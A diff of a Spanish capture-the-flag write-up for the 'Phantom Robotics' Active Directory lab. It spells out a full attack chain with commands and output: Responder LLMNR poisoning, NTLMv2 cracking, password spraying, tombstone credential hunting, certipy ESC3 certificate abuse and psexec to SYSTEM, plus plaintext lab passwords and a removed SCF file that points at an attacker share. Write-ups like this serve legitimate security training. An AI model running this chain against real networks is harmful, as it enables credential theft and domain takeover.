@@ -2,7 +2,7 @@
 layout: single
 title: Phantom Robotics - TheHackerLabs
 excerpt: "."
-date: 2026-04-30
+date: 2026-04-29
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-phantom/phantom.png
@@ -833,27 +833,26 @@ Estamos dentro, sin embargo, no encontraremos la flag del usuario por aqui.
 
 <br>
 
-<h2 id="Responder"></h2>
+<h2 id="Responder">Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2</h2>
 
-```bash
-cat file.scf
-[Shell]
-Command=2
-IconFile=\\192.168.56.102\share\icon.ico
-[Taskbar]
-Command=ToggleDesktop
-```
+Regresando al **servicio SMB**, resulta ser bastante extraño que no tenga ningún archivo y que tengamos permiso de escritura y lectura. 
 
-```bash
-smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --upload file.scf 'Dev Tools/file.scf' --no-banner
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
-[+] Starting upload: file.scf (91 bytes)
-[+] Upload complete..                                                                                                    
-[*] Closed 1 connections
-```
+Antes había mencionado que quizá había algún script que ejecute los archivos/script que se carguen al recurso **Dev Tools**, pero al subir una **Reverse Shell** de **Powershell** y después de esperar un rato, no paso nada.
 
+Sin embargo, aun pienso que hay algo que debe de estar por ahí ejecutandose, así que vamos a analizar el tráfico del **servicio SMB** con la herramienta **Responder** y veremos si es posible aplicar un **LLMNR Poisoning**.
 
+| **LLMNR Poisoning** |
+|:-------------------:|
+| ** |
+
+<br>
+
+Aquí te dejo un blog que explica como es que se aplica el **LLMNR Poisoning**:
+* <a href="https://evoila.com/blog/llmnr-poisoning/" target="_blank">LLMNR Poisoning</a>
+
+Iniciemos el **Responder** y esperemos un poco.
+
+Observa el resultado que obtenemos:
 ```bash
 responder -I eth0
                                          __
@@ -886,7 +885,11 @@ responder -I eth0
 [SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
 [SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL.....
 ```
+Hemos capturado un hash **NTLMv2** del **usuario robert**.
 
+Además, el **Responder** parece mencionar un dominio erroneo, pues el dominio correcto es **PHANTOM.THL** y no **PHANTOM.LOCAL**.
+
+Guarda ese hash en un archivo de texto y usaremos la herramienta **JohnTheRipper** para crackearlo:
 ```bash
 john -w:/usr/share/wordlists/rockyou.txt robertHash
 Using default input encoding: UTF-8
@@ -898,13 +901,17 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
 ```
+Genial, tenemos su contraseña.
 
+Comprobemos que funcione con **netexec**:
 ```bash
 nxc smb 192.168.56.100 -u 'robert' -p '**********'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\robert:**********
 ```
+Funciona y si recordamos, este usuario se puede conectar a la máquina víctima vía **WinRM**.
 
+Conectemonos usando **Evil-WinRM**:
 ```bash
 evil-winrm -i 192.168.56.100 -u 'robert' -p 'bLink182'
                                         
@@ -918,6 +925,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\robert\Documents>
 ```
 
+Estamos dentro y curiosamente, aquí encontraremos el culpable que permitio el **LLMNR Poisoning**:
 ```bash
 *Evil-WinRM* PS C:\Users\robert\Documents> cat connect.ps1
 $username = "PHANTOM.LOCAL\robert"
@@ -929,8 +937,29 @@ while ($true) {
 	Start-Sleep -Seconds 60
 }
 ```
+También encontraremos un archivo de texto, pero ese lo analizaremos más adelante.
 
+En el escritorio, encontraras la flag del usuario:
 ```bash
+*Evil-WinRM* PS C:\Users\robert\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\robert\Desktop> cat user.txt
+...
+```
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+</div>
+<br>
+
+
+<h2 id="Tombstone">Analizando la Tombstone del AD y Aplicando Password Spraying</h2>
+
+Analicemos el mensaje que encontramos en la sesión del **usuario robert**:
+```batch
 *Evil-WinRM* PS C:\Users\robert\Documents> cat migration_notes.txt
 [OK] Verify application connectivity after the ERP migration
 
@@ -950,21 +979,292 @@ Remove unused scripts and obsolete configurations
 
 Document performed steps and lessons learned from the migration
 ```
+Parece ser una lista de cosas por hacer después de una migración, pero podemos leer que hay tema importante, siendo que se deben de eliminar las cuentas temporales que fueron creadas durante la migración.
 
+Es posible revisar los elementos eliminados del AD, consultando la **Tombstone**:
+
+| **Tombstone AD** |
+|:----------------:|
+| *Una tombstone en Active Directory es la representación de un objeto que ha sido eliminado, pero que aún se conserva temporalmente en el directorio antes de borrarse definitivamente.* |
+
+<br>
+
+Te recomiendo revisar estos blogs que mencionan como revisar la **Tombstone** desde **PowerShell**:
+* <a href="https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/" target="_blank">How to Check Tombstone Lifetime of Active Directory</a>
+* <a href="https://admindroid.com/how-to-get-deleted-users-in-active-directory" target="_blank">How to Detect Deleted Users in Active Directory</a>
+
+<br>
+
+Lo primero que debemos hacer es revisar en cuanto tiempo se vacia la **Tombstone**:
+```batch
+*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL" -Properties tombstoneLifetime
+
+DistinguishedName : CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL
+Name              : Directory Service
+ObjectClass       : nTDSService
+ObjectGUID        : 721a02a6-54bc-44dc-9fd9-965b169f1341
+tombstoneLifetime : 2147483647
+```
+Pues se va a vaciar en 5.8 millones de años.
+
+Podemos revisar las cuentas eliminadas con el siguiente comando de **PowerShell**:
+```batch
+*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"'
+
+
+Deleted           : True
+DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
+Name              : dev_test
+                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+ObjectClass       : user
+ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+```
+
+También podemos ver todos los objetos eliminados de la siguiente forma:
+```batch
+*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -SearchBase "CN=Deleted Objects,DC=PHANTOM,DC=THL"
+
+
+Deleted           : True
+DistinguishedName : CN=Deleted Objects,DC=PHANTOM,DC=THL
+Name              : Deleted Objects
+ObjectClass       : container
+ObjectGUID        : 63e0d32e-2125-40ad-8405-c87b353e09b9
+
+Deleted           : True
+DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
+Name              : dev_test
+                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+ObjectClass       : user
+ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+```
+En ambos casos, podemos ver que existio un usuario llamado **dev_test**.
+
+Podemos utilizar el **GUID** de ese usuario para ver sus propiedades como objeto, siendo que encontraremos algo interesante:
 ```bash
-*Evil-WinRM* PS C:\Users\robert\Documents> cd ../Desktop
-*Evil-WinRM* PS C:\Users\robert\Desktop> cat user.txt
+*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Identity "55a7bc61-fdc9-4ecc-bec5-25703d9ee855" -Properties *
 ...
+Deleted                         : True
+Description                     : **********
+DisplayName                     : dev_test
+DistinguishedName               : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
+...
+```
+La descripción del usuario parece ser una contraseña, pero no sabemos a que usuario puede pertenecer.
+
+Apliquemos **Password Spraying** con **netexec** para identificar si un usuario tiene esta contraseña:
+```bash
+nxc smb 192.168.56.100 -u usuarios.txt -p '**********' --no-bruteforce --continue-on-success
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+...
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\tomas:**********
+```
+Perfecto, el **usuario tomas** usa la misma contraseña.
+
+Podemos comprobarlo una vez más con **netexec**:
+```bash
+nxc smb 192.168.56.100 -u 'tomas' -p '**********'
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\tomas:**********
+```
+
+Este usuario también tiene permitido conectarnos a la máquina víctima vía **WinRM**, por lo que usaremos **Evil-WinRM** denuevo:
+```batch
+evil-winrm -i 192.168.56.100 -u 'tomas' -p '**********'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\tomas\Documents> whoami
+phantom\tomas
+```
+
+<br>
+
+<h2 id="ESC3">Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template</h2>
+
+Llegados a este punto, tenemos en nuestro poder las credenciales de 5 usuarios, pero revisando **BloodHound** no encontraremos una forma de escalar privilegios.
+
+En este punto podemos usar la herramienta **winPEAS** para buscar alguna vulnerabilidad.
+
+Al ejecutarlo desde la sesión del **usuario frank**, nos dira lo siguiente:
+```bash
+ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
+È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
+È Check for ADCS misconfigurations in the local DC registry
+  StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.
+  CertificateMappingMethods:  - Strong Certificate mapping enabled.
+  IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.
+  szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.
+È 
+If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
+  Dangerous rights over template: Phantom-DevAuth  (Rights: ExtendedRight)
+  Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)
+  Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)
+  Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)
+  Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)
+  [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).
 ```
 
 
-<br>
-<br>
-<hr>
-<div style="position: relative;">
-  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-</div>
-<br>
+```bash
+certipy-ad find -u 'frank' -p 'JakiadoJeje123' -dc-ip 192.168.56.100 -vulnerable
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+...
+[*] Saving text output to '20260501191831_Certipy.txt'
+[*] Wrote text output to '20260501191831_Certipy.txt'
+[*] Saving JSON output to '20260501191831_Certipy.json'
+[*] Wrote JSON output to '20260501191831_Certipy.json'
+```
+
+```bash
+cat 20260501191831_Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : PHANTOM-DC01-CA
+    DNS Name                            : DC01.PHANTOM.THL
+...
+...
+...
+        Enroll                          : PHANTOM.THL\Authenticated Users
+Certificate Templates                   : [!] Could not find any certificate template
+```
+
+```bash
+certipy-ad find -u 'tomas' -p '**********' -dc-ip 192.168.56.100 -vulnerable
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+...
+[*] Saving text output to '20260430195706_Certipy.txt'
+[*] Wrote text output to '20260430195706_Certipy.txt'
+[*] Saving JSON output to '20260430195706_Certipy.json'
+[*] Wrote JSON output to '20260430195706_Certipy.json'
+```
+
+```bash
+cat 20260430195706_Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : PHANTOM-DC01-CA
+    DNS Name                            : DC01.PHANTOM.THL
+    Certificate Subject                 : CN=PHANTOM-DC01-CA, DC=PHANTOM, DC=THL
+    Certificate Serial Number           : 161A58313EFA72A045F730EFC3CFED39
+    Certificate Validity Start          : 2026-02-21 23:23:37+00:00
+    Certificate Validity End            : 2031-02-21 23:33:37+00:00
+...
+...
+Certificate Templates
+  0
+    Template Name                       : Phantom-DevAuth
+    Display Name                        : Phantom-DevAuth
+    Certificate Authorities             : PHANTOM-DC01-CA
+    Enabled                             : True
+    Client Authentication               : False
+...
+...
+    [+] User Enrollable Principals      : PHANTOM.THL\Tomas
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+```
+
+
+```bash
+certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -target 'DC01.PHANTOM.THL' -template 'Phantom-DevAuth'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 13
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'tomas@PHANTOM.THL'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'tomas.pfx'
+[*] Wrote certificate and private key to 'tomas.pfx'
+```
+
+```bash
+certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca 'PHANTOM-DC01-CA' -target 'DC01.PHANTOM.THL' -template 'User' -on-behalf-of 'administrador' -pfx tomas.pfx
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrador@PHANTOM.THL'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrador.pfx'
+[*] Wrote certificate and private key to 'administrador.pfx'
+```
+
+```bash
+certipy-ad auth -pfx administrador.pfx -username 'administrador' -domain 'PHANTOM.THL' -dc-ip 192.168.56.100
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrador@PHANTOM.THL'
+[*] Using principal: 'administrador@phantom.thl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrador.ccache'
+[*] Wrote credential cache to 'administrador.ccache'
+[*] Trying to retrieve NT hash for 'administrador'
+[*] Got hash for 'administrador@phantom.thl':...
+```
+
+```bash
+export KRB5CCNAME=administrador.ccache
+impacket-psexec administrador@DC01.PHANTOM.THL -k -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on DC01.PHANTOM.THL.....
+[*] Found writable share ADMIN$
+[*] Uploading file SadReSac.exe
+[*] Opening SVCManager on DC01.PHANTOM.THL.....
+[*] Creating service wOFw on DC01.PHANTOM.THL.....
+[*] Starting service wOFw.....
+[!] Press help for extra shell commands
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec
+Microsoft Windows [Versi�n 10.0.20348.587]
+
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+```bash
+impacket-psexec administrador@DC01.PHANTOM.THL -hashes '******'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on DC01.PHANTOM.THL.....
+[*] Found writable share ADMIN$
+[*] Uploading file rTiqzwcC.exe
+[*] Opening SVCManager on DC01.PHANTOM.THL.....
+[*] Creating service YoQl on DC01.PHANTOM.THL.....
+[*] Starting service YoQl.....
+[!] Press help for extra shell commands
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec
+Microsoft Windows [Versi�n 10.0.20348.587]
+
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+```bash
+C:\Windows\system32> cd C:\Users\Administrador\Desktop
+
+C:\Users\Administrador\Desktop> type root.txt
+....
+```
 
 
 <h2 id=""></h2>
@@ -1109,7 +1409,14 @@ type root.txt
 * https://github.com/ShutdownRepo/targetedKerberoast
 * https://www.hackingarticles.in/abusing-ad-dacl-writedacl/
 * https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
+* https://evoila.com/blog/llmnr-poisoning/
+* https://www.cobalt.io/blog/llmnr-poisoning-ntlm-relay
+* https://admindroid.com/how-to-get-deleted-users-in-active-directory
+* https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/
 * https://github.com/61106960/adPEAS
+* https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4
+* https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/
+
 
 <br>
 
